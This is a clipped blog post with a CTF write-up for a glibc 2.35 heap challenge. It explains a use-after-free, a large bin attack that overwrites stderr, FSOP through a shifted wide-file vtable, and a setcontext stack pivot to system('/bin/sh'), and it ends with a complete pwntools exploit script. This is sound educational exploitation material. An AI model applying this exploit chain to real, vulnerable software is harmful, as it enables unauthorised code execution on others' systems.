---
title: Snyk CTF 2026 - PWN Slab Manager (FSOP) | Varik's Blog
source: https://varik.dev/blog/snykctf2026/slab-manager
source_host: varik.dev
clip_date: 2026-09-22T10:16:37+08:00
trace_id: 780d2335-3aaa-49cb-89d7-111c7fd94266
content_hash: 4b8c32309163377bac33f416fbcca860a2aa8fadd3f72f275299aac4f81735e0
status: synced
tags:
  - CTF
  - FSOP
series: null
feed_source: Varik
ai_summary: 核心是把 0x500–0x1000 的 UAF 大块利用 large bin attack 覆写 stderr，再走 FSOP 与栈迁移拿 shell。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 3e375244-d011-81be-a406-d715987d05eb
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 核心是把 0x500–0x1000 的 UAF 大块利用 large bin attack 覆写 stderr，再走 FSOP 与栈迁移拿 shell。
> 
> - **漏洞点：** `deleteSlab` 释放后不清空 `slabs` 数组指针，形成 UAF；而尺寸限制 0x500–0x1000 让所有块绕过 tcache/fastbin 直接进 unsorted/large bin，是 large bin attack 的前提。
> - **利用条件：** Full RELRO + Canary + NX 但无 PIE，`slabs`、`sizes`、`stderr`(0x404040) 地址固定；`main` 退出用 `_exit(0)`，所以经典 `_IO_list_all` 路径失效。
> - **信息泄漏：** 用 UAF 读 P1 在 large bin 中的 fd/bk 得到 `main_arena+1424` 推出 libc 基址，并由 `fd_nextsize` 拿到堆地址，再按固定布局算出 P2。
> - **写入原语：** 把 P1 的 `bk_nextsize` 改成 `stderr-0x20`，下次插入更小块时 glibc 执行 `bk_nextsize->fd_nextsize = P2`，使 `stderr` 指向堆上伪造的 FILE。
> - **FSOP 与栈迁移：** vtable 设为 `_IO_wfile_jumps-24` 绕过 glibc 2.35 校验，调用链落到 `_wide_vtable->__doallocate`；用 `mov rdx,rax; call [rbx+0x28]` 转 `setcontext+61` 抬 `rsp`，ROP 加一次 `ret` 对齐后执行 `system("/bin/sh")`，触发方式是向菜单发送非法选项。

## PWN Slab Manager (FSOP)

We finished 9th as team **xsscorp** in Snyk CTF 2026.

![Snyk CTF 2026 results](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/861612d70b4ac7d3.png)

I didn't manage to solve this one during the CTF, but it kept bothering me. So the following weekend when I had some free time, I sat down and worked through it. Turned out to be a really fun heap exploitation challenge that taught me a lot about glibc internals and FSOP. Here's the full writeup.

**Category:** PWN **Difficulty:** Medium

## Reversing

We got the challenge binary, first step is to reverse it with Ghidra. After reversing we found 4 interesting functions and `main`.

**createSlab** - Allocates a chunk with `malloc`. Index must be < 16, size must be between `0x500` and `0x1000`. Stores the pointer in a global `slabs` array and size in a global `sizes` array.

```c
if ((local_28 < 0x1001) && (0x4ff < local_28)) {
    pvVar2 = malloc((ulong)local_28);
    *(void **)(slabs + (ulong)uVar1 * 8) = pvVar2;
```

**writeSlab** - Reads data into an existing slab using `read(0, slab_ptr, size)`.

**readSlab** - Writes slab content to stdout using `write(1, slab_ptr, size)`.

**deleteSlab** - Frees a slab. And here's the bug:

```c
free(*(void **)(slabs + (long)local_14 * 8));
puts("Slab deleted successfully.");
```

No `NULL` ing of the pointer after `free()`. Classic Use-After-Free.

And `main` is just a menu loop: create (1), read (2), write (3), delete (4), exit (5). For errors it uses `fwrite(..., stderr)`. Exit uses `_exit(0)` (direct syscall, not the libc `exit()`). Keep these in mind, they'll matter later.

## Protections

```javascript
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

No PIE is nice, means all global addresses like `slabs`, `sizes`, and importantly `stderr` at `0x404040` are at fixed locations. Full RELRO means we can't overwrite GOT entries though.

## Vulnerability Analysis

Two things stand out:

1.  **Use-After-Free**: After `deleteSlab`, the pointer stays in the `slabs` array and the size stays in `sizes`. We can read and write to freed chunks.
    
2.  **Size constraint (0x500 - 0x1000)**: This range means all our allocations land in the **large bin** territory. Chunks this size don't go to tcache or fastbins, they go through unsorted bin and eventually get sorted into large bins. This means: large bin attack.
    

## Preparing Debug Environment

Before diving into the exploit, I like to spend some time setting up a proper debug environment. It saves a lot of pain later. The challenge's libc version is different from what I have locally, and instead of a `libc.so` we only get a Dockerfile based on `ubuntu:22.04`. So we need to extract the linker and libc:

```bash
docker run -ti --platform linux/amd64 ubuntu:22.04 bash
docker cp <container_id>:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .
docker cp <container_id>:/lib/x86_64-linux-gnu/libc.so.6 .
```

Then clone the glibc source so we get debug symbols and source code in GDB:

```bash
git clone https://github.com/bminor/glibc.git --depth 1 -b release/2.35/master
```

Also add this to your `.gdbinit`:

```javascript
set debuginfod enabled on
```

The pwntools setup runs the binary with the extracted linker so it loads the correct libc:

```python
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
context.gdb_binary = 'pwndbg'
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote(args.HOST or 'localhost', int(args.PORT or 1337))
else:
    p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])

if args.GDB:
    gdb.attach(p, '''
    file ./chall
    set sysroot .
    directory ./glibc
    c
    ''')
```

We manually load the challenge file and glibc source directory in GDB so it resolves debug symbols and source correctly. With `layout src` we can see the current line inside libc being executed:

![GDB source view](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5a08ae6b0f336900.png)

We can also switch to pwndbg's disassembly view with source code, register state, and stack all visible at once:

![pwndbg source view](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a0411beabc1996ac.png)

And with pwndbg we get `heap` and `bins` commands which are essential for heap exploitation:

![pwndbg heap command](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fe89be79c62ebc15.png) ![pwndbg bins command](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c51c8d139ddad820.png)

## Exploit Strategy

### Quick Recap on Large Bins

When a chunk is freed and it's too large for tcache/fastbins, it goes to the **unsorted bin** first. On the next `malloc`, glibc scans the unsorted bin. If the requested size doesn't match, chunks get sorted into their proper bins. For our sizes, that's the large bins.

Large bin chunks have extra pointers compared to regular free chunks:

```javascript
+0x00  prev_size
+0x08  size
+0x10  fd            ──→ next chunk in bin (same size range)
+0x18  bk            ──→ prev chunk in bin
+0x20  fd_nextsize   ──→ next chunk of DIFFERENT size (sorted descending)
+0x28  bk_nextsize   ──→ prev chunk of DIFFERENT size
```

The `fd_nextsize` / `bk_nextsize` pointers form a skip list sorted by size. When a new chunk is inserted, glibc walks this list to find the right position. And that walk is where the large bin attack lives.

### The Large Bin Attack

The idea is simple: by corrupting `bk_nextsize` of an existing large bin chunk, we can make glibc write a heap address to an arbitrary location during the next insertion.

When a smaller chunk `P2` is inserted after a larger chunk `P1` in the large bin, glibc does:

```c
P1->bk_nextsize->fd_nextsize = P2
```

If we overwrite `P1->bk_nextsize` to point to `TARGET - 0x20`, then:

```c
(TARGET - 0x20)->fd_nextsize = P2
// fd_nextsize is at offset 0x20, so:
// TARGET = P2
```

We get a heap pointer written to any address. One write. That's all we get, so we need to choose the target wisely.

### Choosing the Target

My first instinct was to overwrite `_IO_list_all` - the classic FSOP target. On process exit, glibc walks this list and flushes all FILE streams, so corrupting it gives you code execution.

I spent a good while implementing this... only to realize `main` uses `_exit(0)` (the raw syscall), not `exit()`. The `_exit` syscall doesn't trigger libc cleanup, so `_IO_list_all` never gets walked. Dead end.

But then I looked at the code more carefully. Every error path uses `fwrite(..., stderr)`:

```c
fwrite("[main]: Invalid Option.\n", 1, 0x18, stderr);
fwrite("[createSlab]: Invalid Index.\n", 1, 0x1d, stderr);
// ... etc
```

`stderr` is a global pointer at `0x404040` (no PIE!). If we overwrite it with a pointer to our fake FILE structure on the heap, the next time any error triggers `fwrite(stderr)`, it'll use our fake FILE. We control the vtable, we control execution.

## Exploit Development

### Step 1: Preparing the Heap

We allocate 4 chunks in a specific layout:

```python
create_slab(0, 0x500)  # O1 - guard chunk
create_slab(1, 0x920)  # P1 - large chunk (attacker controlled)
create_slab(2, 0x502)  # O2 - guard chunk
create_slab(3, 0x900)  # P2 - target chunk (will become fake FILE)
```

Guard chunks `O1` and `O2` prevent the free chunks from consolidating with their neighbors (glibc merges adjacent free chunks for efficiency, and we need them separate).

The heap looks like:

```javascript
┌──────────┐
│    O1    │  0x510 bytes (guard)
│  (0x500) │
├──────────┤
│    P1    │  0x930 bytes
│  (0x920) │
├──────────┤
│    O2    │  0x510 bytes (guard)
│  (0x502) │
├──────────┤
│    P2    │  0x910 bytes
│  (0x900) │
├──────────┤
│   top    │
└──────────┘
```

### Step 2: Leaking Libc and Heap

To defeat ASLR we need a libc leak. Free chunks in the unsorted/large bins have `fd` / `bk` pointers into `main_arena` (which is inside libc). And thanks to UAF, we can just read them.

```python
delete_slab(1)          # P1 goes to unsorted bin
create_slab(9, 0x930)   # Larger allocation forces P1 into large bin
data = read_slab(1)     # UAF read on P1!
```

When we allocate 0x930 (larger than P1), glibc scans the unsorted bin. P1 doesn't fit, so it gets sorted into the large bin. The 0x930 chunk gets carved from the top chunk (placed after P2).

Now P1 is in the large bin, and its user data contains:

```javascript
offset 0x00: fd          → main_arena + 1424
offset 0x08: bk          → main_arena + 1424
offset 0x10: fd_nextsize → P1 chunk addr (points to itself, only chunk in bin)
offset 0x18: bk_nextsize → P1 chunk addr
```

We read it all:

```python
MAIN_ARENA = u64(data[:8]) - 1424
libc.address = MAIN_ARENA - MAIN_ARENA_OFFSET
P1 = u64(data[16:24])      # heap leak from fd_nextsize
P2 = P1 + 0x930 + 0x530    # calculate P2 from known heap layout
```

The `MAIN_ARENA_OFFSET` and the `P1→P2` distance were figured out in GDB. With libc base and heap addresses in hand, we're ready for the attack.

### Step 3: Large Bin Attack on stderr

Now we corrupt P1's `bk_nextsize` to target `stderr`:

```python
delete_slab(3)  # Free P2 → goes to unsorted bin

# Overwrite P1's bin pointers via UAF write
payload = bytearray(0x920)
p1_chunk_addr = P1 - 0x10
payload[0:8]   = p64(MAIN_ARENA + 1424)      # fd   (keep valid)
payload[8:16]  = p64(MAIN_ARENA + 1424)      # bk   (keep valid)
payload[16:24] = p64(p1_chunk_addr)           # fd_nextsize (keep valid)
payload[24:32] = p64(STDERR_ADDR - 0x20)     # bk_nextsize → stderr - 0x20
write_slab(1, bytes(payload))

create_slab(5, 0x930)  # Triggers unsorted bin scan → P2 inserted into large bin
```

During the insertion, P2 is smaller than P1, so glibc does:

```c
P1->bk_nextsize->fd_nextsize = P2_chunk
// (STDERR_ADDR - 0x20) + 0x20 = STDERR_ADDR
// stderr = P2_chunk address
```

Now `stderr` points to our P2 chunk on the heap. Any `fwrite` to `stderr` will treat P2 as a `FILE` structure.

```javascript
Before:  stderr ──→ libc's _IO_2_1_stderr_
After:   stderr ──→ P2 chunk on heap (we control this!)
```

### Step 4: The Easy Path vs The Hard Path

Now, the straightforward way to exploit this is simple: you can write `" sh"` into P2's `prev_size` field (by writing to the end of O2's data, since the prev_size of the next chunk overlaps with the usable area of the current chunk). This string becomes the `_flags` field of the fake FILE. Then if you can get `system(fp)` called through the vtable, it'll execute `system(" sh")` which is just `sh` with leading spaces - a valid shell command.

But since I was doing this after the CTF on a weekend with no time pressure, I chose to take the harder path and learn something new. Let's go full FSOP with stack pivoting.

### Step 5: Crafting the Fake FILE

In glibc 2.35, there's a vtable integrity check that verifies the vtable pointer falls within `[__libc_IO_vtables_start, __libc_IO_vtables_end]`. So we can't just point the vtable anywhere. But we CAN point it to a *different* valid vtable at a shifted offset.

The trick: set the vtable to `_IO_wfile_jumps - 24`. This is still within the valid vtable range, but the offset shift means function dispatches land on the wrong entries. When `fwrite` tries to call `__xsputn` (at vtable offset 0x38), it actually reads from `_IO_wfile_jumps + 0x38 - 0x18 = _IO_wfile_jumps + 0x20`, which is `_IO_wfile_underflow`.

This triggers a call chain:

```javascript
fwrite(stderr)
  → vtable->__xsputn  (shifted!)
    → _IO_wfile_underflow(fp)
      → _IO_wdoallocbuf(fp)
        → fp->_wide_data->_wide_vtable->__doallocate(fp)
           ↑ we control this!
```

Here's the `_IO_FILE` structure for reference (216 bytes + 8 byte vtable pointer = 224 bytes total):

```javascript
 offset  field
 ──────  ─────────────────
 0x00    _flags             ← prev_size of chunk
 0x08    _IO_read_ptr       ← size field of chunk
 0x10    _IO_read_end       ──┐
 0x18    _IO_read_base        │
 0x20    _IO_write_base       │  these start at user data (P2)
 0x28    _IO_write_ptr        │  so we control everything from 0x10+
 0x30    _IO_write_end        │
 0x38    _IO_buf_base         │
 0x40    _IO_buf_end          │
  ...    ...                  │
 0x88    _lock              ──┘
 0xa0    _wide_data         ← points to our fake wide_data
 0xd8    vtable             ← _IO_wfile_jumps - 24
```

The fake FILE is crafted inside P2's chunk. Since our FILE starts at the chunk header (`P2 - 0x10`), but we can only write starting from P2's user data (offset `0x10`), the first 16 bytes (`_flags` and `_IO_read_ptr`) are set by the chunk's `prev_size` and `size` fields.

Key fields we set:

```python
# Fields that need specific values to reach our target code path
_IO_read_end  = 0x811      # Must be > _IO_read_ptr to bypass check
_IO_write_end = 0          # Must be 0
_IO_buf_base  = 1          # Must be non-null to trigger doallocate
_fileno       = 1
_lock         = writable_addr  # Must point to something writable (0)
_wide_data    = &fake_wide_data  # Points into our chunk
vtable        = _IO_wfile_jumps - 24  # The shifted vtable
```

The `_wide_data` struct is also placed inside our chunk, with its own `_wide_vtable` pointing to yet another fake table we control. The `__doallocate` slot in that fake table is where we put our gadget.

### Step 6: Stack Pivot & ROP Chain

We need to go from "controlled function pointer call" to "shell". The end goal is to call `system("/bin/sh")`, but we can't just call it directly - we need to pivot the stack to our heap and build a ROP chain there.

First thing I tried was using `one_gadget` to find magic gadgets that spawn a shell in a single jump:

![one\_gadget output](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7812dfee8d8d3a0e.png)

Unfortunately none of them worked because their constraints require `$rbp` to be a writable address, and in our case it's not.

So we need to do this the proper way. After some research I found `setcontext`, which is a classic gadget for pivoting registers from a controlled buffer. Let's look at it:

```
setcontext:       endbr64
setcontext+4:     push   rdi
setcontext+5:     lea    rsi,[rdi+0x128]
setcontext+12:    xor    edx,edx
setcontext+14:    mov    edi,0x2
setcontext+19:    mov    r10d,0x8
setcontext+25:    mov    eax,0xe
setcontext+30:    syscall                    ; rt_sigprocmask
setcontext+32:    pop    rdx
setcontext+33:    cmp    rax,0xfffffffffffff001
setcontext+39:    jae    setcontext+335
setcontext+45:    mov    rcx,QWORD PTR [rdx+0xe0]
setcontext+52:    fldenv [rcx]
setcontext+54:    ldmxcsr DWORD PTR [rdx+0x1c0]
setcontext+61:    mov    rsp,QWORD PTR [rdx+0xa0]   ; pivot stack!
setcontext+68:    mov    rbx,QWORD PTR [rdx+0x80]
setcontext+75:    mov    rbp,QWORD PTR [rdx+0x78]
setcontext+79:    mov    r12,QWORD PTR [rdx+0x48]
setcontext+83:    mov    r13,QWORD PTR [rdx+0x50]
setcontext+87:    mov    r14,QWORD PTR [rdx+0x58]
setcontext+91:    mov    r15,QWORD PTR [rdx+0x60]
setcontext+95:    test   DWORD PTR fs:0x48,0x2
```

It reads all registers from `$rdx`. But the problem is - what's in `$rdx` when we reach our `__doallocate`? Let's check by setting a breakpoint in `_IO_wdoallocbuf` and inspecting the registers:

```javascript
 RAX  0x55555815a6f4 ◂— 0         ← points into our chunk!
 RBX  0x55555815a5e0 ◂— 0         ← our fake FILE (fp)
 RCX  0x811
 RDX  0x911                       ← chunk size, NOT useful
 RDI  0x55555815a5e0 ◂— 0         ← our fake FILE (fp)
```

```asm
 ► _IO_wdoallocbuf+36    mov    rax, qword ptr [rax + 0xe0]
   _IO_wdoallocbuf+43    call   qword ptr [rax + 0x68]     ; __doallocate
```

`$rdx` is `0x911` (just the chunk size metadata) - completely useless. But `$rax`, `$rbx`, and `$rdi` all point into our controlled heap data. So we can't jump to `setcontext` directly since it needs `$rdx` to be our buffer. We need a gadget that sets `$rdx` from one of our controlled registers and then jumps somewhere we control.

I dumped all the gadgets with `ROPgadget --binary ./libc.so.6` and started looking for places where `$rdx` gets set from `$rax`, `$rbx`, or `$rdi`. Found this one:

**1\. mov rdx, rax; call \[rbx + 0x28\]**

```
0x12e936: mov rdx, rax ; call qword ptr [rbx + 0x28]
```

We set this as `__doallocate` in our fake wide vtable. It copies `$rax` (which points into our chunk) into `$rdx`, then does an indirect call through `[rbx + 0x28]`. Since `$rbx` is our fake FILE pointer, `[rbx + 0x28]` is a field we control. We set it to `setcontext + 61` (skipping the syscall at the beginning that would mess things up). So this single gadget sets up `$rdx` and jumps straight to our stack pivot.

**2\. setcontext + 61**

Now `setcontext + 61` runs with `$rdx` pointing to our controlled heap data:

```
setcontext+61:    mov  rsp, [rdx + 0xa0]   ; pivot stack!
setcontext+68:    mov  rbx, [rdx + 0x80]
   ...
setcontext+95:    ...
                  mov  rcx, [rdx + 0xa8]   ; set rcx
                  push rcx                 ; push return address
                  ...
                  ret                      ; jump to rcx
```

Since we control `$rdx` and the memory it points to (it's our heap chunk), we can:

-   Set `$rsp` to point to our ROP chain on the heap
-   Set `$rcx` to the first ROP gadget - this is important because there's a `push $rcx` instruction in `setcontext` that will push it onto our new stack, so we need it to be a valid address or it'll mess up the ROP chain

**3\. ROP chain on the heap**

```python
rop = ROP(libc)
# rcx (pushed to stack first):
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

# Then on the new stack:
payload[new_rsp + 0]  = &"/bin/sh"     # argument for pop rdi
payload[new_rsp + 8]  = ret_gadget     # stack alignment (16-byte)
payload[new_rsp + 16] = &system        # system("/bin/sh")
```

The extra `ret` gadget before `system` is for 16-byte stack alignment, which x86_64 requires before any `call` instruction. Without it, `system` would segfault on a `movaps` instruction.

Putting it all together:

```javascript
fwrite(stderr)                          ← we send invalid menu option
  → _IO_wfile_underflow(fake_fp)        ← shifted vtable dispatch
    → _IO_wdoallocbuf(fake_fp)
      → __doallocate = gadget           ← mov rdx, rax; call [rbx+0x28]
        → setcontext+61                 ← pivots RSP to heap
          → pop rdi; ret
          → "/bin/sh"
          → ret (alignment)
          → system                      ← shell!
```

### Step 7: Trigger

All that's left is to trigger an error that calls `fwrite` to our corrupted `stderr`:

```python
p.sendlineafter(b'>', b'123')  # Invalid menu option → fwrite(stderr)
p.interactive()                # Shell!
```

## Full Exploit

```python
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
context.gdb_binary = 'pwndbg'
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote(args.HOST or 'localhost', int(args.PORT or 1337))
else:
    p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])

if args.GDB:
    gdb.attach(p, '''
    file ./chall
    set sysroot .
    directory ./glibc
    b _IO_wfile_underflow
    b _IO_wdoallocbuf
    b system
    b *setcontext+61
    c
    ''')

slab_sizes = {}

def create_slab(idx, size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'slab:', str(idx).encode())
    p.sendlineafter(b'slab:', str(size).encode())
    slab_sizes[idx] = size

def read_slab(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'slab:', str(idx).encode())
    p.recvuntil(b'Content of Slab:\n')
    return p.recvn(slab_sizes[idx])

def write_slab(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'slab:', str(idx).encode())
    p.send(data)

def delete_slab(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'slab:', str(idx).encode())

# --- Constants ---
STDERR_ADDR = 0x404040
STDERR_LOCK_OFFSET = 2214512
MAIN_ARENA_OFFSET = 2206848

# --- Step 1: Heap layout ---
create_slab(0, 0x500)   # O1 guard
create_slab(1, 0x920)   # P1 large chunk
create_slab(2, 0x502)   # O2 guard
create_slab(3, 0x900)   # P2 target chunk

# --- Step 2: Leak libc & heap ---
delete_slab(1)          # P1 → unsorted bin
create_slab(9, 0x930)   # Force P1 into large bin
data = read_slab(1)     # UAF read

MAIN_ARENA = u64(data[:8]) - 1424
libc.address = MAIN_ARENA - MAIN_ARENA_OFFSET
P1 = u64(data[16:24])
P2 = P1 + 0x930 + 0x530

log.success(f"Libc Base = {hex(libc.address)}")
log.success(f"P1 = {hex(P1)}")
log.success(f"P2 = {hex(P2)}")
assert libc.address % 4096 == 0

# --- Step 3: Large bin attack on stderr ---
delete_slab(3)  # P2 → unsorted bin

payload = bytearray(slab_sizes[1])
p1_chunk_addr = P1 - 0x10
payload[0:8]   = p64(MAIN_ARENA + 1424)
payload[8:16]  = p64(MAIN_ARENA + 1424)
payload[16:24] = p64(p1_chunk_addr)
payload[24:32] = p64(STDERR_ADDR - 0x20)
write_slab(1, bytes(payload))

create_slab(5, 0x930)  # Trigger large bin insertion → stderr = P2

# --- Step 4: Craft fake FILE in P2 ---
offset = 0x10
fake_file_addr = P2 - offset
wfile_jumps_addr = libc.symbols['_IO_wfile_jumps']
payload = bytearray(slab_sizes[3] - 2)

payload[16 - offset:24 - offset] = p64(0x811)       # _IO_read_end
payload[48 - offset:56 - offset] = p64(0)           # _IO_write_end
payload[56 - offset:64 - offset] = p64(1)           # _IO_buf_base
payload[112 - offset:116 - offset] = p32(1)         # _fileno
payload[136 - offset:144 - offset] = p64(fake_file_addr + 0x150)  # _lock

wide_data_addr = fake_file_addr + 260
wide_vtable_addr = wide_data_addr + 256
payload[160 - offset:168 - offset] = p64(wide_data_addr)            # _wide_data
payload[216 - offset:222 - offset] = p64(wfile_jumps_addr - 24)     # vtable

# wide_data->_wide_vtable
wide_data_rel_offset = 260
payload[wide_data_rel_offset + 224:wide_data_rel_offset + 232] = p64(wide_vtable_addr)

# wide_vtable->__doallocate = gadget
wdoallocate_addr = wide_data_rel_offset + 224 + 136
payload[wdoallocate_addr:wdoallocate_addr + 8] = p64(libc.address + 0x12e936)

# [rbx + 0x28] = setcontext+61
payload[0x28:0x30] = p64(libc.sym['setcontext'] + 61)

# Stack pivot via setcontext
rop_offset = 532
rsp_offset = rop_offset + (0xa0 - 16)
rcx_offset = rop_offset + (0xa8 - 16)
new_rsp = (fake_file_addr + rop_offset + 208) & ~0xf
new_rsp_offset = new_rsp - fake_file_addr

rop = ROP(libc)
payload[rsp_offset:rsp_offset + 8] = p64(new_rsp)
payload[rcx_offset:rcx_offset + 8] = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload[new_rsp_offset:new_rsp_offset + 8] = p64(next(libc.search(b'/bin/sh')))
payload[new_rsp_offset + 8:new_rsp_offset + 16] = p64(rop.find_gadget(['ret'])[0])
payload[new_rsp_offset + 16:new_rsp_offset + 24] = p64(libc.sym['system'])

write_slab(3, bytes(payload))

# --- Step 5: Trigger ---
p.sendlineafter(b'>', b'123')
p.interactive()
```

## Resources

-   [how2heap - large bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c) - Great reference for understanding the large bin insertion mechanism
-   [La Casa de Papel writeup](https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/) - Detailed FSOP writeup that helped me a lot with the wide data vtable technique
-   [pwndbg](https://pwndbg.re/stable/setup/) - Absolute must-have for heap exploitation
-   [pwntools](https://github.com/Gallopsled/pwntools) - Python exploit development framework
-   [one_gadget](https://github.com/david942j/one_gadget) - Tool for finding magic gadgets in libc
-   [glibc source](https://elixir.bootlin.com/glibc/glibc-2.35/source/) - When in doubt, read the source
